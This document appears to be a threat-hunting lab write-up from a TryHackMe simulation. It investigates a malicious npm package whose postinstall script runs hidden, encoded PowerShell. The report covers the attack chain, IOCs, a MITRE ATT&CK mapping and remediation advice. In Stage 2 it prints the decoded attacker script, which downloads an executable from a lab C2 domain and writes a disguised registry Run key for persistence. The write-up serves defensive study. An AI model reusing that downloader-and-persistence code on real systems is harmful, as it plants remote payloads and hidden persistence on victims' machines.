# Threat Hunt — npm Supply-Chain Compromise via `healthchk-lib` (Registry Persistence)

**Type:** Independent security investigation (threat hunting lab practice — TryHackMe SIEM simulation)
**Date:** 30 July 2026
**Classification:** Supply-Chain Compromise — Malicious npm Package → PowerShell Downloader → Registry Persistence
**Severity:** High — hidden PowerShell execution, external C2 contact, and persistent access established on an affected host; single-host scope confirmed
**Tools used:** Splunk (Sysmon-based SIEM), CyberChef (Base64 / UTF-16LE decoding)

---

## 1. Executive Summary

A simulated incident was investigated in a Splunk-based SOC environment (TryHackMe "Threat Hunting Simulator" — *Health Hazard* scenario). The starting hypothesis: an attacker leveraged a compromised third-party software package to gain initial access and silently stage a payload, establishing persistence to maintain long-term access.

The hypothesis was **proven**. A co-founder's workstation (`paw-tom`) installed a malicious npm package, `healthchk-lib@1.0.1`, while building the company website. The package's `postinstall` script auto-executed a hidden, Base64-encoded PowerShell command that resolved and staged a payload from attacker infrastructure (`global-update.wlndows.thm`), then wrote a registry Run key disguised as a Windows update service to survive reboots and re-execute on every logon. No lateral movement or spread to other monitored hosts (`paw-penny`, `paw-tabitha`) was observed.

## 2. Source Material

- Sysmon-based Windows event logs ingested into Splunk (`index=main`, `sourcetype=_json`), including ProcessCreate (EventCode 1), FileCreate (EventCode 11), RegistryEvent (EventCode 13), and DNS Query (EventCode 22)
- Threat intel briefing and IOC sheet issued by "TryDetectThis Intelligence" (TLP:AMBER), describing a coordinated npm/PyPI supply-chain campaign
- Decoded PowerShell payload (Base64 → UTF-16LE) recovered directly from process command-line data

## 3. Hypothesis Validation

**Hypothesis:** *An attacker may have leveraged a compromised third-party software package to gain initial access to the system and silently stage a payload for later execution. They likely established persistence to maintain access without immediate detection.*

**Result: Proven.** All three sub-objectives (initial access, malicious execution, persistence) were independently confirmed against host `paw-tom` using process, file, registry, and DNS telemetry.

## 4. Attack Chain

| Stage | Time (2025-06-21) | Tactic (MITRE ATT&CK) | Technique | Description |
|---|---|---|---|---|
| 1 — Initial Access / Execution | 10:58:24 – 10:58:27 | Initial Access | Supply Chain Compromise: Compromised Software Dependencies (T1195.002) | User ran `npm install healthchk-lib@1.0.1`. The package's `postinstall` script auto-executed, spawning a hidden, Base64-encoded PowerShell command via `cmd.exe` |
| 2 — Command & Control / Payload Staging | 10:58:27 – 10:58:29 | Command and Control | Ingress Tool Transfer (T1105) | Decoded PowerShell resolved and contacted `global-update.wlndows.thm` via DNS, staging `SystemHealthUpdater.exe` for download to `%APPDATA%` |
| 3 — Persistence | 10:58:29 | Persistence | Boot or Logon Autostart Execution — Registry Run Keys (T1547.001) | PowerShell wrote `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update Monitor`, re-launching the payload via encoded PowerShell on every logon |

### Stage 1 detail
```
10:58:24  powershell.exe → npm install healthchk-lib@1.0.1
10:58:27  node.exe (npm-cli.js) → cmd.exe /d /s /c powershell.exe -NoP -W Hidden -EncodedCommand <base64>
10:58:27  FileCreate: C:\Development\node_modules\healthchk-lib\scripts\postinstall.ps1
```

### Stage 2 detail — decoded payload (Base64 → UTF-16LE)
```powershell
$dest = "$env:APPDATA\SystemHealthUpdater.exe"
$url = "http://global-update.wlndows.thm/SystemHealthUpdater.exe"
Invoke-WebRequest -Uri $url -OutFile $dest

$encoded = [Convert]::ToBase64String(
    [Text.Encoding]::Unicode.GetBytes("Start-Process '$dest'")
)
$runCmd = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + $encoded

Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'Windows Update Monitor' -Value $runCmd
```
Corroborating DNS telemetry (Sysmon EventCode 22):
```
10:58:29  powershell.exe → Query: global-update.wlndows.thm → Result: 127.0.0.1 (lab sinkhole)
```

### Stage 3 detail
```
10:58:29  RegistryEvent (Value Set)
          Image: powershell.exe
          TargetObject: HKU\S-1-5-21-...\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update Monitor
          Details: powershell.exe -NoP -W Hidden -EncodedCommand <base64>
```

### Ruled out during investigation
A Windows Defender scheduled task write (`svchost.exe` → `...\Windows Defender\Windows Defender Scheduled Scan`) occurred in the same second as the attack. Process-lineage review confirmed this was spawned by `MsMpEng.exe` → `MpCmdRun.exe SignatureUpdate -ScheduleJob -RestrictPrivileges` — legitimate Defender signature-update maintenance, unrelated to the attacker's activity.

## 5. Scope

Searched all hosts for the same IOCs (package name, registry key, malicious domain, dropped script path). No matches found outside `paw-tom`.

**Scope: single host — `paw-tom` (user: `tom@pawpress.me`). No lateral movement or spread confirmed.**

## 6. Indicators of Compromise (IOCs)

### Host-based
| Type | Value |
|---|---|
| NPM Package | `healthchk-lib@1.0.1` |
| Dropped Script | `C:\Development\node_modules\healthchk-lib\scripts\postinstall.ps1` |
| Registry Path | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| Registry Value Name | `Windows Update Monitor` |
| Downloaded File Path | `%APPDATA%\SystemHealthUpdater.exe` |
| Process Execution | `powershell.exe -NoP -W Hidden -EncodedCommand <base64>` |

### Network-based
| Type | Value |
|---|---|
| Download URL | `http://global-update.wlndows.thm/SystemHealthUpdater.exe` |
| Hostname Contacted | `global-update.wlndows.thm` |
| Protocol / Port | HTTP (unencrypted) / 80 |
| Traffic Behavior | Outbound file download to `%APPDATA%` via PowerShell |

## 7. Investigation Timeline (Analyst Workflow)

1. Reviewed briefing and IOC sheet; formed search strategy around npm/node process lineage
2. Searched Sysmon ProcessCreate events for `npm`/`node` spawning shell processes — found `npm install healthchk-lib@1.0.1` followed 3 seconds later by an encoded PowerShell execution via `cmd.exe`
3. Decoded the Base64/UTF-16LE `-EncodedCommand` in CyberChef, revealing the downloader-and-persistence script
4. Searched FileCreate events for `paw-tom`, confirming the `postinstall.ps1` script artifact and ruling a coincidentally-timed scheduled-task write in as benign Defender activity
5. Searched RegistryEvent (Value Set) telemetry, confirming the `Windows Update Monitor` Run key write
6. Attempted network-connection (EventCode 3) searches for the malicious domain — none logged for `paw-tom` (host had no EventCode 3 telemetry at all)
7. Pivoted to DNS Query telemetry (EventCode 22), confirming resolution of `global-update.wlndows.thm` by `powershell.exe`
8. Searched all IOCs across other hosts (`paw-penny`, `paw-tabitha`) — no matches; scope confirmed as single-host

## 8. MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Supply Chain Compromise: Compromised Software Dependencies and Development Tools | T1195.002 | `npm install healthchk-lib@1.0.1` → auto-executed `postinstall.ps1` |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | Hidden, Base64-encoded PowerShell spawned via `cmd.exe` |
| Command and Control | Ingress Tool Transfer | T1105 | `Invoke-WebRequest` download of `SystemHealthUpdater.exe` from `global-update.wlndows.thm` |
| Persistence | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | T1547.001 | `HKCU\...\Run\Windows Update Monitor` registry value |
| Defense Evasion | Obfuscated Files or Information: Command Obfuscation | T1027 | Nested Base64-encoded PowerShell commands (`-EncodedCommand`), hidden window (`-W Hidden`) |

## 9. Conclusion

This investigation confirms a supply-chain compromise consistent with the threat intel briefing: a trojanized, low-profile npm package was used to gain a foothold on a developer workstation, silently staged a payload from attacker-controlled infrastructure, and established registry-based persistence disguised as a legitimate Windows update process. The incident is assessed as contained to a single host, with no evidence of lateral movement to other monitored assets at time of investigation.

## 10. Recommendations

- Isolate `paw-tom` from the network pending full remediation; remove the `Windows Update Monitor` Run key and any dropped `SystemHealthUpdater.exe` payload
- Block outbound resolution/connections to `global-update.wlndows.thm` and any associated infrastructure at DNS/firewall level
- Purge and reinstall `node_modules` from a known-clean lockfile; pin dependencies and vet `postinstall` scripts before allowing them to run (e.g., `npm install --ignore-scripts` as a default policy for unfamiliar packages)
- Alert on `powershell.exe -EncodedCommand -W Hidden` process creation patterns, and on any process writing to `HKCU\...\CurrentVersion\Run` outside of known software installers
- Extend logging coverage: this host had no Sysmon EventCode 3 (network connection) telemetry, which delayed confirmation of the C2 contact — ensure network-connection logging is enabled consistently across all endpoints
- Broader control recommendation: adopt a private/vetted npm registry or dependency-scanning gate (e.g., Socket, Snyk) for build pipelines to catch newly-published or recently-transferred packages before they reach developer machines

---

*Prepared as independent threat-hunting lab practice (TryHackMe SIEM simulation), applying SOC investigation methodology (Sysmon/SIEM log analysis, payload decoding, MITRE ATT&CK mapping) to a simulated npm supply-chain compromise. All hostnames, domains, and identifiers are lab-generated and non-production.*
